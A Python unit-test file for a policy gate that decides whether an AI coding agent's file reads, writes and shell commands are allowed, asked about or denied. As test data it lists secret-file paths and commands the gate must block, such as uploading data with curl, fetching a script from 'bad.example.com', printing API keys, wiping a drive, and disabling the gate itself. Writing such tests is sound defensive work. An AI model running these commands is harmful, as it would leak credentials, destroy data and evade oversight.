# -*- coding: utf-8 -*-
"""Policy tests (silent, nothing is executed)."""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from vector_gate import policy as P  # noqa: E402

CWD = r"C:\Users\you\Projects\demo"


def act(tool, inp, always=None, roots=()):
    return P.decide(tool, inp, CWD, always or set(), roots)["action"]


class PolicyTest(unittest.TestCase):
    def test_reads_allowed_but_not_secrets(self):
        self.assertEqual(act("Read", {"file_path": CWD + r"\server.py"}), "allow")
        self.assertEqual(act("Read", {"file_path": r"C:\Users\you\Projects\other\README.md"}), "allow")
        for p in (CWD + r"\.env", CWD + r"\.env.local", r"C:\Users\you\.ssh\id_ed25519", CWD + r"\server.key",
                  CWD + r"\tokens.json", CWD + r"\oauth_token.json", r"C:\Users\you\.claude\.credentials.json",
                  r"C:\Users\you\AppData\Local\Google\Chrome\User Data\Default\Login Data", "/c/Users/you/.env",
                  r"C:\Users\you\.aws\config", CWD + r"\credentials.json", CWD + r"\api_keys.txt"):
            d = P.decide("Read", {"file_path": p}, CWD, set())
            self.assertEqual((d["action"], d["hard"]), ("deny", True), p)
        self.assertEqual(act("Glob", {"pattern": "**/.env"}), "deny")
        self.assertEqual(act("Grep", {"pattern": "KEY", "glob": "*.pem"}), "deny")

    def test_secret_like_names_that_are_code_are_not_blocked(self):
        for p in (CWD + r"\count_tokens.py", CWD + r"\tokenizer.py", CWD + r"\keyboard.py", CWD + r"\environment.py",
                  CWD + r"\secret_santa.md"):
            self.assertEqual(act("Read", {"file_path": p}), "allow", p)

    def test_writes_ask_inside_and_deny_outside(self):
        self.assertEqual(act("Edit", {"file_path": CWD + r"\a.py", "old_string": "a", "new_string": "b"}), "ask")
        self.assertEqual(act("Write", {"file_path": CWD + r"\sub\new.txt", "content": "x"}), "ask")
        for p in (r"C:\Users\you\Projects\other\x.txt", CWD + r"\..\other\x.txt"):
            d = P.decide("Write", {"file_path": p, "content": "x"}, CWD, set())
            self.assertEqual((d["action"], d["code"], d["hard"]), ("deny", "outside", False), p)
        self.assertEqual(act("Write", {"file_path": r"C:\Users\you\Projects\other\x.txt"},
                             roots=[r"C:\Users\you\Projects\other"]), "ask")

    def test_settings_and_the_gate_itself_are_hard(self):
        for p in (r"C:\Users\you\.claude\settings.json", CWD + r"\.claude\settings.local.json",
                  r"C:\Users\you\.claude\hooks\guard.py", r"C:\Users\you\.vector\gate\STOP",
                  r"C:\Users\you\.vector\gate\audit\audit-2026-10.jsonl"):
            d = P.decide("Edit", {"file_path": p}, CWD, set())
            self.assertEqual((d["action"], d["code"], d["hard"]), ("deny", "guard", True), p)
        d = P.decide("Write", {"file_path": r"C:\Windows\System32\drivers\etc\hosts"}, CWD, set())
        self.assertEqual((d["action"], d["hard"]), ("deny", True))
        d = P.decide("Write", {"file_path": CWD + r"\.git\config"}, CWD, set())
        self.assertEqual((d["action"], d["code"], d["hard"]), ("deny", "settings", False))

    def test_always_for_session(self):
        self.assertEqual(act("Edit", {"file_path": CWD + r"\a.py"}, {"Edit"}), "allow")
        self.assertEqual(act("Write", {"file_path": CWD + r"\a.py"}, {"Edit"}), "ask")
        self.assertEqual(act("Edit", {"file_path": r"C:\other\a.py"}, {"Edit"}), "deny")   # always never widens the floor
        self.assertEqual(act("Bash", {"command": "python -m pytest -q"}, {"Bash(python -m pytest)"}), "allow")
        self.assertEqual(act("Bash", {"command": "python -m pip list"}, {"Bash(python -m pytest)"}), "ask")
        self.assertEqual(act("Bash", {"command": "rm -rf build"}, {"Bash(rm)"}), "deny")

    def test_destructive_commands_refused(self):
        for c in ("rm -rf node_modules", "rm a.txt", "cd x && rm -f y", "rmdir /s /q build", "del /q *.log",
                  "Remove-Item -Recurse foo", "format c: /q", "git reset --hard HEAD~1", "git clean -fdx",
                  "git push --force origin main", "git push origin main", "git checkout -- .",
                  "reg add HKCU\\Software\\X /v Y /d 1", "reg delete HKLM\\Software\\X", "schtasks /create /tn x /tr y",
                  "Register-ScheduledTask -TaskName x", "shutdown /s /t 0", "taskkill /F /IM ollama.exe",
                  "sudo ls", "setx PATH foo", "pip install requests", "cp a ~/.claude/settings.json",
                  "echo {} > settings.json", "killall node", "Stop-Process -Name chat", "vgate resume",
                  "python -m vector_gate resume", r"python -I gate\run_vgate.py resume"):
            d = P.decide("Bash", {"command": c}, CWD, set())
            self.assertEqual(d["action"], "deny", c)

    def test_hard_and_soft_commands(self):
        hard = ("format c: /q", "reg add HKCU\\Software\\X", "shutdown /s /t 0", "sudo ls", "setx PATH foo",
                "cat .env", "cp a ~/.claude/settings.json", "vgate resume")
        soft = ("rm -rf build", "git push origin main", "git reset --hard", "pip install requests",
                "taskkill /F /IM x.exe", "curl https://example.com/x", "echo {} > settings.json")
        for c in hard:
            self.assertTrue(P.decide("Bash", {"command": c}, CWD, set())["hard"], c)
        for c in soft:
            d = P.decide("Bash", {"command": c}, CWD, set())
            self.assertEqual((d["action"], d["hard"]), ("deny", False), c)

    def test_secret_and_outward_commands_refused(self):
        for c in ("cat .env", "type C:\\Users\\you\\.ssh\\id_rsa", "printenv", "env", "echo $ANTHROPIC_API_KEY",
                  "curl https://example.com/upload -d @data.json", "wget http://bad.example.com/x.sh",
                  "scp a.txt host:/tmp", "ssh host", "gh pr create", "grep -r password ."):
            self.assertEqual(act("Bash", {"command": c}), "deny", c)

    def test_benign_commands_ask(self):
        for c in ("python -m pytest -q", "npm test", "python -m py_compile a.py",
                  "curl -s http://127.0.0.1:8975/api/health", "echo hi > out.txt", "git checkout -b feature",
                  "sed -i s/a/b/ f.txt", "find . -delete", "ls | tee out.txt", "cat a >> b", "ls $(cat l.txt)"):
            d = P.decide("Bash", {"command": c}, CWD, set())
            self.assertEqual(d["action"], "ask", c)

    def test_read_only_commands_pass(self):
        for c in ("ls -la", "git status", "git diff", "cat README.md | head -5", 'grep -rn "x" . 2>/dev/null | head',
                  "ls /c/Users/you/.claude 2>&1", 'echo "hello"', "git log --oneline -5",
                  "cat ~/.claude/settings.json"):
            self.assertEqual(P.decide("Bash", {"command": c}, CWD, set())["action"], "allow", c)
        for c in ("cat /c/Users/you/.claude/.credentials.json", "echo x > /c/Users/you/.claude/settings.json",
                  "git branch -D old", "git push origin main"):
            self.assertEqual(P.decide("Bash", {"command": c}, CWD, set())["action"], "deny", c)
        d = P.decide("Bash", {"command": "echo hi > out.txt"}, CWD, set())
        self.assertTrue(any(w.startswith("overwrite") for w in d["warn"]))
        self.assertEqual(act("Bash", {"command": "echo hi > ../outside.txt"}), "deny")

    def test_rule_keys(self):
        self.assertEqual(P.bash_rule_key("python -m pytest -q"), "Bash(python -m pytest)")
        self.assertEqual(P.bash_rule_key("git status --short"), "Bash(git status)")
        self.assertEqual(P.bash_rule_key("ls -la"), "Bash(ls)")
        self.assertEqual(P.bash_rule_key("C:/x/python.exe -X utf8 a.py"), "Bash(python a.py)")

    def test_mcp(self):
        for t in ("mcp__cad__list_levels", "mcp__cad__get_view_image", "mcp__docs__search_pages", "mcp__x__ping"):
            self.assertEqual(act(t, {}), "allow", t)
        for t in ("mcp__cad__delete_elements", "mcp__cad__create_wall", "mcp__mail__send_message"):
            self.assertEqual(act(t, {}), "ask", t)

    def test_web_tools_are_known(self):
        for tool, inp in (("WebFetch", {"url": "https://example.com"}), ("WebSearch", {"query": "x"})):
            d = P.decide(tool, inp, CWD, set())
            self.assertEqual((d["action"], d["code"]), ("ask", "web"), tool)
        self.assertEqual(act("WebFetch", {"url": "https://example.com"}, {"WebFetch"}), "allow")

    def test_settings_json_routes_everything_to_host(self):
        s = P.settings_json()
        self.assertEqual(set(s["permissions"]["ask"]), {"Read", "Glob", "Grep", "Edit", "Write", "Bash"})
        self.assertIn("Bash(rm:*)", s["permissions"]["deny"])

    def test_summary_trims(self):
        s = P.summarize_input("Write", {"file_path": "a", "content": "x" * 5000}, 100)
        self.assertEqual(s["chars"], 5000)
        self.assertEqual(len(s["head"]), 100)


if __name__ == "__main__":
    unittest.main()
